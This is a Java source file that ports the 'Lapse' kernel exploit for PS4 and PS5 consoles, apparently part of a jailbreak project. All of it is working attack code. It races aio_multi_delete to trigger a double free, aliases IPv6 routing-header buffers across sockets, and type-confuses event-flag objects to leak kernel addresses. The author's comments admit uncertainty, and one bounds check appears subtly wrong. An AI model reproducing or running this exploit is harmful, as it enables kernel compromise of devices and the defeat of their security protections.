// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright (C) 2025 anonymous - Lapse
// Copyright (C) 2025 Kimari - Java port

package org.bdj.lapse;

import java.io.StringWriter;

/* Lapse is a kernel exploit for PS4 [5.00, 12.50) and PS5 [1.00-10.20) disclosed by an anonymous
 * developer ("abc") in 2025. Credit goes to abc for the proof-of-concept, Al-Azif for lapse.mjs,
 * and shahrilnet and znull_ptr for lapse.lua. BlueLapse primarily references the latter.
 *
 * https://www.psdevwiki.com/ps4/Vulnerabilities#FW_5.00-12.02_-_Double_free_due_to_aio_multi_delete()_improper_locking
 * https://github.com/shahrilnet/remote_lua_loader/blob/main/payloads/lapse.lua
 * https://github.com/Al-Azif/psfree-lapse/blob/main/src/lapse.mjs
 *
 * Any code in BlueLapse based on work from lapse.lua or lapse.mjs is available under the GNU Affero
 * General Public License. See the LICENSE file in the repository root for details.
 */

import org.bdj.Console;
import org.bdj.api.API;
import org.bdj.api.Buffer;
import org.bdj.lapse.LibKernel.PthreadBarrier;
import org.bdj.lapse.LibKernel.AioErrorArray;
import org.bdj.lapse.LibKernel.AioRWRequestArray;
import org.bdj.lapse.LibKernel.AioSubmitIdArray;
import org.bdj.lapse.LibKernel.Evf;
import org.bdj.lapse.LibKernel.Socket;
import org.bdj.lapse.Library.SystemCallFailed;

public class Lapse extends Thread {
	public final LibKernel k;
	public final API api;
	public final LibC c;

	public Lapse(LibKernel libkernel) {
		k = libkernel;
		api = k.api;
		c = k.libc;
	}

	public void run() {
		try {
			exploit();
		} catch (Throwable e) {
			Console.log(e);
		} finally {
			cleanup();
		}
	}

	// Pinning seems to break the double-free part for me. I guess that cursed socket nonsense
	// lapse.lua does really is necessary. Hopefully NOT pinning doesn't cause any problems...
	// FIXME: I don't actually know if THIS is what breaks the exploit. Something definitely does.
	// public static final int CPU_CORE = 4;
	// public int initialCPUAffinity = 0;

	// Note from lapse.lua: on game process, only < 130? sockets can be created
	public static final int NUM_SOCKETS = 64;     // NUM_SDS in lapse.lua
	public static final int NUM_SOCKETS_ALT = 48; // NUM_SDS_ALT in lapse.lua

	// FIXME: Better naming once I figure out what these are actually used for?
	Socket[] sockets = new Socket[NUM_SOCKETS];
	Socket[] socketsAlt = new Socket[NUM_SOCKETS_ALT];

	AioSubmitIdArray ids = null; // should all be cancelled during cleanup

	private void exploit() throws Throwable {
		Console.log("Lapse: setting things up");

		// Pin so that we only use one per-CPU bucket. Makes heap spraying/grooming easier.
		// initialCPUAffinity = k.cpuGetAffinityForCurrentThread();
		// k.cpuSetAffinityForCurrentThread(1 << CPU_CORE);

		// *****************************************************************************************
		// Step 1: Double-free AIO request
		// *****************************************************************************************

		final int NUM_AIO_REQUESTS = 3;
		final int WHICH_REQUEST = NUM_AIO_REQUESTS - 1;

		AioRWRequestArray reqs = k.new AioRWRequestArray(NUM_AIO_REQUESTS);
		ids = k.new AioSubmitIdArray(NUM_AIO_REQUESTS);
		AioSubmitIdArray deleteIds = ids.slice(WHICH_REQUEST, 1);
		AioErrorArray mainErr = k.new AioErrorArray(1);
		AioErrorArray raceErr = k.new AioErrorArray(1);
		PthreadBarrier barrier = k.new PthreadBarrier(2);

		try {
			for (int i = 0; i < sockets.length; i++) {
				sockets[i] = k.new Socket(LibKernel.AF_INET6, LibKernel.SOCK_DGRAM, LibKernel.IPPROTO_UDP);
			}
			for (int i = 0; i < socketsAlt.length; i++) {
				socketsAlt[i] = k.new Socket(LibKernel.AF_INET6, LibKernel.SOCK_DGRAM, LibKernel.IPPROTO_UDP);
			}
		} catch (SystemCallFailed e) {
			Console.log(e);
			Console.log("This usually means you have to close the application and try again.");
			return;
		}

		// Just keep track of address for this, Buffer wrapper gets in the way
		// NOTE: We leak this but it probably doesn't matter. Or ought to be leaked anyway?
		final int RTHDR_SIZE = 0x80;
		long aliasRthdrBufAddr = 0;

		// Bare minimum initialization to succeed in calling aio_submit_cmd()
		for (int i = 0; i < reqs.count; i++) { reqs.get(i).fd.set(-1); } // make_reqs1

		// Initial heap grooming (maybe this will make the exploit more stable?)
		final int NUM_GROOM_TRIES = 512;
		AioSubmitIdArray groomIds = k.new AioSubmitIdArray(NUM_AIO_REQUESTS);
		Console.log("Lapse: initial heap grooming pass");
		for (int i = 0; i < NUM_GROOM_TRIES; i++) {
			k.aioSubmitCmd(LibKernel.AIO_CMD_MULTI_READ, reqs, groomIds);
			k.aioMultiCancel(groomIds, null);
		}

		final int NUM_DOUBLE_FREE_TRIES = 20000;
		boolean success = false;

		for (int i = 0; i < NUM_DOUBLE_FREE_TRIES; i++) {
			Console.log("Lapse: double-free attempt " + i);
			// FIXME: abc's PoC does this (and the wait) inside the loop but that seems weird?
			// lapse.lua/mjs does it outside the loop, try that and see if it still works
			try {
				// Issue requests and get back submission IDs to use later
				// Command and priority do not matter but the MULTI flag is required
				k.aioSubmitCmd(LibKernel.AIO_CMD_MULTI_WRITE, reqs, ids);
				Console.log("-> aioSubmitCmd MULTI_WRITE for " + reqs.count + " reqs => ids");
			} catch (SystemCallFailed e) {
				Console.log(e);
				Console.log("This usually means you have to close the application and try again.");
				return;
			}

			// You cannot delete any request that is already being processed by a
			// SceFsstAIO worker thread.
			// We just wait on all of them instead of polling and checking whether
			// a request is being processed. Polling is also error-prone since the
			// result can become out of date.
			k.aioMultiWait(ids, null, LibKernel.AIO_WAIT_AND);

			Console.log("-> aioMultiWait for " + ids.count + " ids (0x" +
				Long.toHexString(ids.address()) + ") done");

			RaceThread racer = new RaceThread(barrier, deleteIds, raceErr);
			Console.log("-> starting race thread");
			racer.start();

			// Sync point between threads
			barrier.barrierWait();

			// Hopefully both threads will call aio_multi_delete at the same time
			// PANIC: This call will make the system vulnerable to a kernel panic:
			// Double free on the 0x80 malloc zone. Important kernel data may alias.
			k.aioMultiDelete(deleteIds, mainErr);

			Console.log("-> aioMultiDelete for " + deleteIds.count + " ids (0x" +
				Long.toHexString(deleteIds.address()) + ") done");

			// Wait for race thread to finish
			racer.join();
			Console.log("-> race thread finished");

			// RESTORE: This code will reserve the double freed memory (see PANIC above).
			// FIXME: Is this actually the case or am I totally misunderstanding?
			aliasRthdrBufAddr = api.malloc(RTHDR_SIZE);
			Console.log("-> allocated aliased buffer at 0x" + Long.toHexString(aliasRthdrBufAddr));

			// Read errors. The race is successful if they are both zero.
			int m = mainErr.get(0).id.get();
			int r = raceErr.get(0).id.get();
			Console.log("-> errors: 0x" + Integer.toHexString(m) + " 0x" + Integer.toHexString(r));
			if (m == 0 && r == 0) {
				Console.log("-> double free achieved!");
				success = true;
				break;
			}

			Console.log("-> attempt failed");
		}

		if (!success) {
			Console.log("Lapse: couldn't achieve double free in " + NUM_DOUBLE_FREE_TRIES + " tries");
			return;
		}

		// Continue with make_aliased_rthdrs from lapse.lua/mjs
		// RESTORE: This will fill the double freed memory with harmless data (see PANIC above).

		Console.log("Lapse: make aliased rthdrs");

		Buffer aliasRthdrBuf = new Buffer(aliasRthdrBufAddr, RTHDR_SIZE);
		aliasRthdrBuf.fill((byte)0); // should probably do this before anything else...
		int markerOffset = 4; // into aliasRthdrBuf, used to check if we've successfully aliased?

		int ip6rLen = ((RTHDR_SIZE >> 3) - 1) & (~1);
		int rthdrLen = (ip6rLen + 1) << 3; // rsize in lapse
		Buffer aliasRthdrBufAdjLen = new Buffer(aliasRthdrBufAddr, rthdrLen);

		Console.log("-> RTHDR_SIZE " + RTHDR_SIZE + " ip6rLen " + ip6rLen + " rthdrLen " + rthdrLen);

		// IPV6_RTHDR (routing header?) options struct for setsockopt
		aliasRthdrBuf.putByte(0, (byte)0);              // ip6r_nxt
		aliasRthdrBuf.putByte(1, (byte)ip6rLen);        // ip6r_len
		aliasRthdrBuf.putByte(2, (byte)0);              // ip6r_type
		aliasRthdrBuf.putByte(3, (byte)(ip6rLen >> 1)); // ip6r_segleft

		Socket[] aliasSocketPair = new Socket[2];

		final int NUM_RTHDR_ALIAS_TRIES = 1000;
		boolean aliasSocketPairFound = false;

		for (int iTry = 0; iTry < NUM_RTHDR_ALIAS_TRIES; iTry++) {
			Console.log("Lapse: aliased socket pair attempt " + iTry);
			for (int iSocket = 0; iSocket < NUM_SOCKETS; iSocket++) {
				Socket socket = sockets[iSocket];
				aliasRthdrBuf.putInt(markerOffset, iSocket);
				// Does setsockopt actually need to be called with rthdrLen?
				socket.setOption(LibKernel.IPPROTO_IPV6, LibKernel.IPV6_RTHDR, aliasRthdrBufAdjLen);
			}
			for (int iSocket = 0; iSocket < NUM_SOCKETS; iSocket++) {
				Socket socket = sockets[iSocket];
				// Why pass the full length here but not for setsockopt in 1st loop? Does it matter?
				socket.getOption(LibKernel.IPPROTO_IPV6, LibKernel.IPV6_RTHDR, aliasRthdrBuf);
				int marker = aliasRthdrBuf.getInt(markerOffset);
				if (marker != iSocket) {
					Console.log("-> marker " + marker + " != isocket " + iSocket);
					// Save aliased socket pair
					aliasSocketPair[0] = sockets[iSocket];
					aliasSocketPair[1] = sockets[marker];
					// Replace them with new ones in the sockets array
					sockets[iSocket] = k.new Socket(LibKernel.AF_INET6, LibKernel.SOCK_DGRAM, LibKernel.IPPROTO_UDP);
					sockets[marker]  = k.new Socket(LibKernel.AF_INET6, LibKernel.SOCK_DGRAM, LibKernel.IPPROTO_UDP);
					int fd0 = aliasSocketPair[0].fd, fd1 = aliasSocketPair[1].fd;
					Console.log("-> aliased rthdr socket fds: " + fd0 + ", " + fd1);
					aliasSocketPairFound = true;
					break;
				}
			}
			Console.log("-> clear other rthdrs");
			// Clear rthdrs for everything other than the aliased pair
			for (int iSocket = 0; iSocket < NUM_SOCKETS; iSocket++) {
				Socket socket = sockets[iSocket];
				socket.setOption(LibKernel.IPPROTO_IPV6, LibKernel.IPV6_RTHDR, new Buffer(0, 0));
			}
			if (aliasSocketPairFound) {
				break;
			}
		}

		if (!aliasSocketPairFound) {
			Console.log("Lapse: couldn't make aliased rthdrs in " + NUM_RTHDR_ALIAS_TRIES + " tries");
			return;
		}

		// MEMLEAK: If we won the race, aio_obj.ao_num_reqs got decremented twice.
		// So this call will leave the kernel-side struct for one request undeleted.
		k.aioMultiDelete(ids, null);
		Console.log("-> aioMultiDelete " + ids.count + " ids (0x" +
			Long.toHexString(ids.address()) + ") done");

		// *****************************************************************************************
		// Step 2: Leak kernel addresses using the aliased socket pair
		// *****************************************************************************************

		Console.log("Lapse: leaking kernel addresses");

		final int LEAK_LEN = 16;
		Buffer leakBuf = new Buffer(RTHDR_SIZE * LEAK_LEN);
		leakBuf.fill((byte)0);
		Buffer leakBufRthdrSized = new Buffer(leakBuf.address(), RTHDR_SIZE);

		// I have no idea what the fuck an evf is.
		// Syscall signatures as documented by lapse.mjs (which mismatches psdevwiki, btw):
		//  int evf_create(char *name, uint32_t attributes, uint64_t flags) -- returns id
		//  int evf_set(int id, uint64_t flags)
		//  int evf_clear(int id)
		//  int evf_delete(int id)

		// The point of this step is to leak the contents of the rthdr I guess?
		Console.log("-> type-confuse struct evf with struct ip6_rthdr");

		// Free one rthdr
		Socket sd = aliasSocketPair[0];
		Console.log("-> close socket fd " + aliasSocketPair[1].fd + " & keep fd " + sd.fd);
		aliasSocketPair[1].close();

		final int NUM_LEAK_TRIES = 100;
		final int NUM_EVFS = 0x100;
		Evf[] evfs = new Evf[NUM_EVFS];
		Evf confusedEvf = null;

		for (int iTry = 0; iTry < NUM_LEAK_TRIES; iTry++) {
			// Reclaim freed rthdr with evf object
			Console.log("Lapse: rthdr/evf alias attempt " + iTry);
			Console.log("-> create new evfs with flags 0xf00 | (i << 16)");
			for (int iEvf = 0; iEvf < NUM_EVFS; iEvf++) {
				// From lapse.mjs: flags must be set to >= 0xf00 to fully leak contents of rthdr
				int flags = 0xf00 | (iEvf << 16);
				evfs[iEvf] = k.new Evf(0, flags);
			}

			// In Lapse: get_rthdr(sd, buf, 0x80)
			Console.log("-> socket " + sd.fd + " getsockopt IPV6_RTHDR");
			sd.getOption(LibKernel.IPPROTO_IPV6, LibKernel.IPV6_RTHDR, leakBufRthdrSized);

			// Check required because sometimes we read values way out of bounds?
			// I don't really understand what we're reading from leakBuf anyway
			int flags = leakBuf.getInt(0);
			if ((flags & 0xf00) == 0xf00) {
				int idx = flags >> 16;
				Evf evf = evfs[idx];
				Console.log("-> read flags 0x" + Integer.toHexString(flags) + " idx " + idx);

				// This set changes the rthdr length I guess?
				int expectedFlags = flags | 1;
				evf.set(expectedFlags);
				Console.log("-> set flags 0x" + Integer.toHexString(expectedFlags));

				// In Lapse: get_rthdr(sd, buf, 0x80)
				Console.log("-> socket " + sd.fd + " getsockopt IPV6_RTHDR");
				sd.getOption(LibKernel.IPPROTO_IPV6, LibKernel.IPV6_RTHDR, leakBufRthdrSized);

				// Check if we've done anything interesting
				int newFlags = leakBuf.getInt(0);
				if (newFlags == expectedFlags) {
					Console.log("-> type-confusion successful on attempt " + iTry);
					confusedEvf = evfs[idx];
					evfs[idx] = null;
				} else {
					Console.log("-> attempt failed, read flags 0x" + Integer.toHexString(newFlags));
				}
			} else {
				Console.log("-> attempt failed, read flags 0x" + Integer.toHexString(flags));
			}

			Console.log("-> deleting other evfs");
			for (int iEvf = 0; iEvf < NUM_EVFS; iEvf++) {
				if (evfs[iEvf] != null) {
					evfs[iEvf].delete();
				}
			}

			if (confusedEvf != null) break;
		}

		if (confusedEvf == null) {
			Console.log("Lapse: couldn't leak kernel addresses in " + NUM_LEAK_TRIES + " tries");
			return;
		}

		// ip6_rthdr and evf obj are overlapped by now
		// enlarge ip6_rthdr by writing to its len field by setting the evf's flag
		Console.log("-> enlarging ip6_rthdr");
		confusedEvf.set(0xff << 8);

		// Structure of evf as documented by lapse.mjs:
		//  offset 0x0:  u64 flags
		//  offset 0x28: struct cv cv - first field is char* cv_description, always "evf cv"
		//  offset 0x38: TAILQ_HEAD(struct evf_waiter) waiters - what even...

		// Now we can get an address inside the kernel's mapped ELF file via evf.cv.cv_description
		// I guess the point of all of this is to defeat ASLR?
		long keEvfCvDescAddr = leakBuf.getLong(0x28);
		Console.log("-> leaked kernel address of 'evf cv': 0x" + Long.toHexString(keEvfCvDescAddr));

		// From lapse.mjs: because of TAILQ_INIT(), we have:
		//  evf.waiters.tqh_last == &evf.waiters.tqh_first
		// We now know the address of the kernel buffer we are leaking

		long keLeakBufAddr = leakBuf.getLong(0x40) - 0x38;
		Console.log("-> leaked kernel address of buffer: 0x" + Long.toHexString(keLeakBufAddr));

		// 0x80 < num_elems * sizeof(SceKernelAioRWRequest) <= 0x100
		// Allocate reqs1 arrays at 0x100 malloc zone
		final int NUM_ELEMS = 6;
		AioRWRequestArray leakReqs = k.new AioRWRequestArray(NUM_ELEMS);
		for (int i = 0; i < leakReqs.count; i++) { leakReqs.get(i).fd.set(-1); } // make_reqs1

		// Use reqs1 to fake an aio_info. Set .ai_cred (offset 0x10) to offset 4 of the reqs2 so
		// crfree(ai_cred) will harmlessly decrement the .ar2_ticket field
		leakReqs.buffer.putLong(0x10, keLeakBufAddr + 4);

		Console.log("-> find aio_entry");

		final int NUM_FIND_AIO_ENTRY_TRIES = 100;
		long reqs2Offset = 0;
		AioSubmitIdArray leakIds = k.new AioSubmitIdArray(NUM_EVFS * NUM_ELEMS);

		for (int i = 0; i < NUM_FIND_AIO_ENTRY_TRIES; i++) {
			sd.getOption(LibKernel.IPPROTO_IPV6, LibKernel.IPV6_RTHDR, leakBufRthdrSized);

			// spray_aio
			int idsOffset = 0, idsStep = NUM_ELEMS;
			for (int j = 0; j < NUM_EVFS; j++) {
				k.aioSubmitCmd(LibKernel.AIO_CMD_MULTI_WRITE, leakReqs, leakIds.slice(idsOffset, idsStep));
				idsOffset += idsStep;
			}

			sd.getOption(LibKernel.IPPROTO_IPV6, LibKernel.IPV6_RTHDR, leakBufRthdrSized);

			for (int offset = 0x80; offset < leakBuf.size() - RTHDR_SIZE; offset++) {
				// lapse.mjs calls this entire block verify_reqs2
				if (leakBuf.getInt(offset) == LibKernel.AIO_CMD_WRITE) {
					continue;
				}

				// We're looking for kernel heap addresses, which are prefixed with 0xffff_xxxx with
				// xxxx randomized on boot.
				short heapPrefix = 0;

				// Check if offsets 0x10 to 0x20 look like a kernel heap address
				boolean foundKernelHeapAddr = false;
				for (int offset2 = 0x10; offset2 <= 0x20; offset2 += 8) {
					if (leakBuf.getShort(offset + offset2 + 6) != 0xffff) {
						foundKernelHeapAddr = false; // can stop looking
						break;
					}
					heapPrefix = leakBuf.getShort(offset + offset2 + 4);
					foundKernelHeapAddr = true;
				}
				if (!foundKernelHeapAddr) {
					continue; // try verify_reqs2 with another offset
				}

				// Check reqs2.ar2_result.state. It's a 32-bit value but the allocated memory was
				// initialized with zeroes so all padding bytes must be 0.
				int state = leakBuf.getInt(offset + 0x38);
				int padding = leakBuf.getInt(offset + 0x38 + 4);
				if (!(0 < state && state <= 4) || padding != 0) {
					continue; // try verify_reqs2 with another offset
				}

				// Check reqs2.ar2_file, must be NULL since we passed a bad fd to aio_submit_cmd
				long file = leakBuf.getLong(offset + 0x40);
				if (file != 0) {
					continue; // try verify_reqs2 with another offset
				}

				// Check if offsets 0x48 to 0x50 look like a kernel address
				foundKernelHeapAddr = false;
				for (int offset2 = 0x48; offset2 <= 0x50; offset2 += 8) {
					if (leakBuf.getShort(offset + offset2 + 6) == 0xffff) {
						// Don't push kernel ELF addresses
						if (leakBuf.getShort(offset + offset2 + 4) != 0xffff) {
							if (leakBuf.getShort(offset + offset2 + 4) == heapPrefix) {
								foundKernelHeapAddr = true;
							}
						}
						// offset 0x48 can be NULL
					} else if (i == 0x50 || leakBuf.getLong(offset + offset2) != 0) {
						foundKernelHeapAddr = false;
						break; // can stop looking
					}
				}
				if (!foundKernelHeapAddr) {
					continue; // try verify_reqs2 with another offset
				}

				reqs2Offset = offset;
				break;
			}

			if (reqs2Offset == 0) {
				continue; // next attempt
			}

			Console.log("-> found reqs2 at 0x" + Console.hex(leakBuf.address() + reqs2Offset) + " on attempt " + i);

			// free_aios
			try {
				k.aioMultiCancel(leakIds, null);
				k.aioMultiPoll(leakIds, null);
				k.aioMultiDelete(leakIds, null);
			} catch (Throwable e) {}
		}

		if (reqs2Offset == 0) {
			Console.log("-> failed to find reqs2 after " + NUM_FIND_AIO_ENTRY_TRIES + " attempts");
			return;
		}

		sd.getOption(LibKernel.IPPROTO_IPV6, LibKernel.IPV6_RTHDR, leakBufRthdrSized);
		Console.log("-> leaked aio_entry:");
		for (int offset = 0; offset <= 0x80; offset += 16) {
			StringWriter sw = new StringWriter();
			for (int i = 0; i < 16; i++) {
				String hex = Console.hex(leakBuf.getByte(offset + i));
				if (hex.length() == 1) { sw.write('0'); }
				sw.write(hex);
				sw.write(' ');
			}
			Console.log("-> " + sw.toString());
		}

		Console.log("Lapse: end of PoC");
	}

	private class RaceThread extends Thread {
		private PthreadBarrier barrier;
		private AioSubmitIdArray ids;
		private AioErrorArray errors;

		public RaceThread(PthreadBarrier barrier, AioSubmitIdArray ids, AioErrorArray errors) {
			this.barrier = barrier;
			this.ids = ids;
			this.errors = errors;
		}

		public void run() {
			// Not sure if this is a good idea but whatever
			// k.cpuSetAffinityForCurrentThread(1 << CPU_CORE);

			// Sync point between threads
			barrier.barrierWait();

			// Hopefully both threads will call aio_multi_delete at the same time
			k.aioMultiDelete(ids, errors);
		}
	}

	private void cleanup() {
		// k.cpuSetAffinityForCurrentThread(initialCPUAffinity);
		for (int i = 0; i < sockets.length;    i++) sockets   [i].close();
		for (int i = 0; i < socketsAlt.length; i++) socketsAlt[i].close();
		k.aioMultiCancel(ids, null);
	}
}
